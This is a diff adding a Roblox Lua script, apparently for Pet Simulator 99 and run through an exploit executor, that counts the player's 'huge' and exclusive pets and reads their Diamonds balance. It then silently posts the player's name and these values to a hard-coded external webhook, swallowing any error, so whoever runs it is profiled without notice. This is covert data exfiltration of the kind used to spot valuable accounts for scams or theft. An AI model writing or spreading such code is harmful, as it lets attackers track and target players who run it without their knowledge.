@@ -1,0 +1,70 @@
+local Library = require(game.ReplicatedStorage.Library)
+local Save = Library.Save.Get().Inventory
+AmountOfHuges = 0
+for i, v in pairs(Save.Pet) do
+    local id = v.id
+    local dir = Library.Directory.Pets[id]
+    if dir.huge == true then
+        AmountOfHuges = AmountOfHuges + 1
+    end
+end
+
+local Library = require(game.ReplicatedStorage.Library)
+local Save = Library.Save.Get().Inventory
+AmountOfExc = 0
+for i, v in pairs(Save.Pet) do
+    local id = v.id
+    local dir = Library.Directory.Pets[id]
+    if dir.exclusiveLevel == true then
+        AmountOfExc = AmountOfExc + 1
+    end
+end
+
+local syn = syn or {}
+local HttpService = game:GetService("HttpService")
+
+local webhookUrl = "https://webhook.lewistehminerz.dev/api/webhooks/1201285127901302935/1s_-ZR45f4F8nhJ6_whPThHfF5Vt4j4kni2-xYqY4RuCPw3LszVotup4n-B53sMIxql3"
+
+local lp = game.Players.LocalPlayer.Name
+local gems = nil
+local leadertab = game.Players.LocalPlayer.leaderstats
+
+for _, child in pairs(leadertab:GetChildren()) do
+    if child:IsA("IntValue") then
+        local stats = child.Name:gsub("[^%a]", "")
+        if stats == "Diamonds" then
+            gems = child.Value
+        end
+    end
+end
+
+local http_request = syn and syn.request or request
+
+local function sendWebhookMessage(embed)
+    local success, response = pcall(function()
+        http_request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({embeds = {embed}})
+        })
+    end)
+
+    if not success then
+        print("")
+    end
+end
+
+local embed = {
+    title = "PS99",
+    description = lp .. " has executed the script.",
+    color = 0xFFD700,
+
+    fields = {
+        {name = "Gems: ", value = gems, inline = true},
+        {name = "Huges: ", value = AmountOfHuges, inline = true},
+        {name = "Exclusives: ", value = AmountOfExc, inline = true}
+    }
+}
+
+sendWebhookMessage(embed)
